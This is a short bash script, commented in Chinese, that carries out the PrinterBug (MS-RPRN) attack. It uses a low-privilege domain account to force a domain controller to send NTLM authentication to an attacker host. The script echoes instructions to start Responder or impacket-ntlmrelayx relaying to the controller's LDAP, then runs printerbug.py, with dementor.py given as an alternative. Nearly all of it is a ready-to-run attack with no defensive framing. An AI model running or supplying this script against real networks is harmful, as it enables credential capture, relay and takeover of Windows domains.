#!/bin/bash
# PrinterBug 强制 NTLM 回连脚本
# 利用 MS-RPRN 打印机协议强制域控向攻击机发起 NTLM 认证

DC_IP="192.168.1.10"
ATTACKER_IP="10.10.10.1"
DOMAIN="corp"
USER="lowpriv_user"
PASS="Password123!"

echo "[*] 第一步：在攻击机启动 Responder 或 ntlmrelayx"
echo "    responder -I eth0 -wrf"
echo "    或"
echo "    impacket-ntlmrelayx -t ldap://${DC_IP} --no-dump"
echo ""

echo "[*] 第二步：触发 PrinterBug，强制域控回连攻击机"
python3 printerbug.py ${DOMAIN}/${USER}:${PASS}@${DC_IP} ${ATTACKER_IP}

# 也可使用 dementor.py
# python3 dementor.py -d ${DOMAIN} -u ${USER} -p ${PASS} ${ATTACKER_IP} ${DC_IP}

echo "[*] 等待域控发起 NTLM 认证..."
